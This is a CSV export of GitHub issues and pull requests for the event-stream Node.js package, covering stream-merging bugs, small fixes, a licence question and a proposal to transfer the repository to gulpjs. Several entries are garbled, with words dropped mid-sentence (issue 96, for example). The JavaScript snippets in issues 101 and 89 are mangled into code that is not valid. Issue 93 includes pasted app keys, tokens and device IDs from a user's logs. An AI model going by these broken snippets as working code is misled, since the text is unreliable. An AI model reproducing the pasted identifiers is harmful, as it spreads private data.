ID,State,Time Created,Time Updated,Time Closed,Pull Request?,Username,User ID,Author Association,Number of Comments,Title,Body
106,closed,2017-07-06T08:55:16Z,2018-09-16T10:45:49Z,2018-09-16T10:45:49Z,1,aaleksu,1092344,NONE,2,fixed undefined error on e.pipe in toMerge.forEach,Got an undefined error in our project. This is just an quick is an <\r><\n><\r><\n>TypeError: Cannot read property at /var/www/<preoject>/node_modules/event-stream/index.js:43:6<\r><\n> at Array.forEach (native)<\n>
105,closed,2017-07-06T08:44:33Z,2017-07-06T15:51:19Z,2017-07-06T15:51:19Z,1,aaleksu,1092344,NONE,0,fixed undefined error on e.pipe in toMerge.forEach,I just got an error in our project: "TypeError: Cannot read property 'pipe' of undefined ... at /var/www/<my_project>/node_modules/event-stream/index.js:43:6<\r><\n> at Array.forEach (native) ...".<\r><\n>I don't know why e might be undefined<c> but this is just a quick fix.<\n>
103,closed,2017-03-20T14:00:26Z,2017-03-22T00:50:09Z,2017-03-22T00:50:08Z,1,detailyang,3370345,CONTRIBUTOR,0,doc: layout tweaks,Hello.<\r><\n><\r><\n>Just a little tweaks and README.markdown do not correctly show the CI status.<\n>
102,closed,2016-09-21T21:49:04Z,2018-09-04T05:39:39Z,2018-09-04T05:39:38Z,0,dominictarr,259374,OWNER,9,transfer to gulpjs,I no longer use this and to by many modules in the gulp ecosystem<c> and I the gulp be better stewards of event-stream<\n><\n>Would it be okay if I transfered this to the gulp organization?<\n><\n>@gulpjs @callumacrae @contra @gratimax @heikki @phated @robinboehm @tkellen<\n><\n>
101,closed,2016-09-16T18:08:47Z,2018-09-06T08:07:06Z,2018-09-06T08:07:06Z,0,stevenvachon,170197,NONE,4,merge at end of chain doesn't complete task,= {<\n> const docs = gulp.src("./less/docs.less")<\n> .pipe( less(lessOptions) )<\n> .pipe( )<\n> .pipe( gulp.dest("./docs/") const = .pipe( less(lessOptions) )<\n> .pipe( concat("framework.css") )<\n> .pipe( )<\n> .pipe( gulp.dest("./docs/") es.merge(docs<c> framework);<\n>}<\n>```<\n><\n>```<\n>[14:08:35] The following tasks Did you forget to signal async completion?<\n>```<\n><\n>It completes the in the chain:<\n><\n>``` js<\n>return es.merge(docs<c> framework)<\n> .pipe( gulp.dest("./docs/")
100,closed,2016-09-09T08:57:43Z,2016-09-11T11:29:51Z,2016-09-09T11:56:54Z,1,360disrupt,7427903,NONE,5,Rename LICENCE to LICENSE,http://grammarist.com/spelling/licence-license/ <c> with the previous file name the license checker does not find the license.<\n><\n>
99,closed,2016-08-15T12:25:37Z,2018-09-05T04:38:37Z,2018-09-05T04:38:37Z,0,davidbarton,1619732,NONE,1,Dependency to map-stream,Hi<c> `package.json` specifies dependency to `"map-stream": "~0.1.0"` which I am unable to find in repo https://github.com/dominictarr/map-stream.<\n><\n>My issue is that installed `map-stream 0.1.0` has custom licence and `map-stream 0.0.6` has MIT (preferable). Can you please take a look and update package dependency?<\n><\n>Reproduce<\n><\n>```<\n>npm init -y<\n>npm i --save map-stream@0.1.0<\n>cat node_modules/map-stream/LICENCE<\n>cat node_modules/map-stream/package.json<\n>```<\n><\n>
98,closed,2016-07-24T05:41:27Z,2018-09-05T04:09:18Z,2018-09-05T04:09:17Z,0,milanbella,4014265,NONE,1,simple example pretty.js - split,is not instructive of concepts and is buggy.<\n><\n>Curl fetches only one line EOL mapping only just one line of input to json is not good way explaining the concept of mapping more then one line pretty.js has crashed in json has correctly generated empty string after last EOL terminating last
97,closed,2016-07-19T16:11:32Z,2016-07-20T12:56:06Z,2016-07-20T12:56:06Z,0,drdpedroso,12386985,NONE,2,Error in parsing when using arrow functions,I'm getting queh trying to es.merge my javascript files.<\n><\n>```<\n> stream.js:75<\n> throw er; // Unhandled stream error in pipe.<\n>```<\n><\n>The error message:<\n> Error: Error in parsing: "modules/example/controllers/example-controller.js"<c> Line 8: Unexpected token )<\n><\n>My Controller file:<\n><\n>```<\n> self.toggleSidenav = () => {<\n> return $mdSidenav('left').toggle();<\n> };<\n>```<\n><\n>Is there some solution for it? <\n><\n>
96,closed,2016-07-17T00:09:11Z,2016-07-17T07:24:08Z,2016-07-17T07:24:03Z,1,andrejewski,1660953,CONTRIBUTOR,2,emits "end" if no streams,If there streams I a of because I was merging a variable size array of streams that happen to be empty.<\n><\n>
95,closed,2016-06-18T15:49:39Z,2016-06-18T23:43:05Z,2016-06-18T23:43:05Z,1,nyurik,1641515,CONTRIBUTOR,6,Handle mapSync() exceptions as stream errors,This patch allows synchronious callback to properly<\n>report errors to the stream by throwing exceptions.<\n><\n>mapSync() will convert them into the stream errors<c><\n>catchable with on('error' ...)<\n><\n>https://github.com/dominictarr/event-stream/issues/94<\n><\n>P.S. The trailing spaces got automatically cleaned up by IDE<\n><\n>
94,closed,2016-06-17T03:19:07Z,2016-06-18T23:44:37Z,2016-06-18T23:43:26Z,0,nyurik,1641515,CONTRIBUTOR,4,exception in mapSync causes fatal error,The error thrown in the middle of the mapSync() cases application exception. Shouldn't mapSync handle that? Also<c> do I need to do `on('error')` after each stream transformation?<\n><\n>``` lang=js<\n>return new Promise(function (resolve<c> reject) {<\n> var s = fs.createReadStream(srcFile)<\n> .on('error'<c> reject)<\n> .pipe(es.split())<\n> .on('error'<c> reject)<\n> .pipe(es.mapSync(function (line) {<\n> ...<\n> throw new Error();<\n> ...<\n> }).on('error'<c> reject)<\n> .pipe(fs.createWriteStream(outputFile))<\n> .on('error'<c> reject)<\n> .on('finish'<c> function () {<\n> resolve(outputFile);<\n> });<\n>});<\n>```<\n><\n>
93,closed,2016-01-14T10:35:12Z,2016-01-19T07:47:58Z,2016-01-19T07:47:58Z,0,ghost,10137,NONE,2,es.merge broke my data,I have 12 files to handle<c> so I want to create 12 ReadStreams and merge to one.<\n><\n>In each file<c> each line is a JSON string.<\n><\n>My code is like this: <\n><\n>```<\n> fileNames = fileNames.filter(Boolean);<\n> es.merge(fileNames.map(function(item<c> index) {<\n> return fs.createReadStream(item);<\n> }))<\n> .pipe(es.split())<\n> .pipe(es.parse())<\n>```<\n><\n>After run it<c> I got some JSON.parse error like this: <\n><\n>> SyntaxError: Unexpected token <\n><\n>and I found the error json looks like this:<\n><\n>```<\n>{"ts":1452700832306<c>"segments":{"sex":1<c>"age":5<c>"os":1<c>"deviceprice":5}<c>"appkey":"560129b88bda20a5270f88da"<c>"token":"jXL29pROAnEGng"<c>"deviceid":"D4FB58CD-39{"ts":1452700810077<c>"appkey":"560129b88bda20a5270f88da"<c>"token":"jXL29pROAnEGng"<c>"deviceid":"B8DA0F64C613E896B412788B9BDB06D4"}<\n>```<\n><\n>I grep **1452700832306** and **1452700810077**<c> and find they come from two different files:<\n><\n>in file1<c> test1.log: <\n><\n>```<\n>{"ts":1452700832306<c>"segments":{"sex":1<c>"age":5<c>"os":1<c>"deviceprice":5}<c>"appkey":"560129b88bda20a5270f88da"<c>"token":"jXL29pROAnEGng"<c>"deviceid":"D4FB58CD-39CF-4445-AD26-C85194C0D032"}<\n>```<\n><\n>in file2<c> test2.log:<\n><\n>```<\n>{"ts":1452700810077<c>"appkey":"560129b88bda20a5270f88da"<c>"token":"jXL29pROAnEGng"<c>"deviceid":"B8DA0F64C613E896B412788B9BDB06D4"}<\n>```<\n><\n>So it looks like some of my data has been broken.<\n><\n>**Node version**: v4.2.3<\n>**OS**: CentOS Linux release 7.0.1406 (Core)<\n><\n>
92,closed,2015-12-08T00:51:40Z,2015-12-13T06:51:02Z,2015-12-13T06:50:58Z,1,GERN2015,12283094,NONE,1,BRADS MEDIA,<\n>
91,closed,2015-11-25T10:23:30Z,2018-09-06T05:15:08Z,2018-09-06T05:15:08Z,0,YuraRudkovskiy,7432353,NONE,1,es.merge. node 5.1.0. Does not work.,Use example at https://www.npmjs.com/package/event-stream<\n><\n>``` sh<\n>es.merge(<\n> process.stdout<c><\n> process.stderr<\n>).pipe(fs.createWriteStream('output.log'));<\n>```<\n><\n>I have error:<\n><\n>``` sh<\n>events.js:141<\n> throw er; // Unhandled 'error' event<\n> ^<\n><\n>Error: read ENOTCONN<\n> at exports._errnoException (util.js:856:11)<\n> at WriteStream.Socket._read (net.js:394:21)<\n> at WriteStream.Readable.read (_stream_readable.js:328:10)<\n> at WriteStream.Socket.read (net.js:283:43)<\n> at resume_ (_stream_readable.js:718:12)<\n> at doNTCallback2 (node.js:452:9)<\n> at process._tickCallback (node.js:366:17)<\n> at Function.Module.runMain (module.js:459:11)<\n> at startup (node.js:138:18)<\n> at node.js:974:3<\n>```<\n><\n>Could you offer how to fix it?<\n><\n>
90,closed,2015-11-24T09:52:43Z,2018-09-05T04:28:28Z,2018-09-05T04:28:27Z,0,yinrong,4221569,NONE,4,es.split generate a empty line for trailing newline,es.split is mostly used for processing line by line<c> however we usually get an empty line at the end of the file. Please remove trailing newline.<\n><\n>
89,closed,2015-09-21T06:40:43Z,2015-09-22T08:13:27Z,2015-09-22T08:13:27Z,0,XeCycle,763350,CONTRIBUTOR,2,Add a es.chain?,I like this js<\n>function chain(...streams) {<\n> var [head] = var = streams.reduce((prev<c> curr) => return that I can write<\n><\n>``` js<\n>function formatter() {<\n> return chain(<\n> es.split()<c><\n> es.mapSync(...)<c><\n> es.stringify()<\n> );<\n>}<\n><\n>someStream.pipe(formatter());<\n>```<\n><\n>Would you like this added to event-stream? If yes please also tell me what behaviour you want<c> e.g. multiple arguments what to also I can go PR.<\n><\n>
88,closed,2015-09-16T22:47:03Z,2015-09-17T00:51:17Z,2015-09-17T00:51:17Z,1,johnw424,2890568,CONTRIBUTOR,1,Fix spelling error in index.js,Fixed spelling error in console.error from "attemping to parse" to "attempting to parse"<\n><\n>
87,closed,2015-05-06T02:46:58Z,2015-05-06T02:58:12Z,2015-05-06T02:58:12Z,1,psalaets,123952,CONTRIBUTOR,1,minor tweak to a few headings in readme,Adjusts a few headings so they're more noticeable at https://www.npmjs.com/package/event-stream<\n><\n>
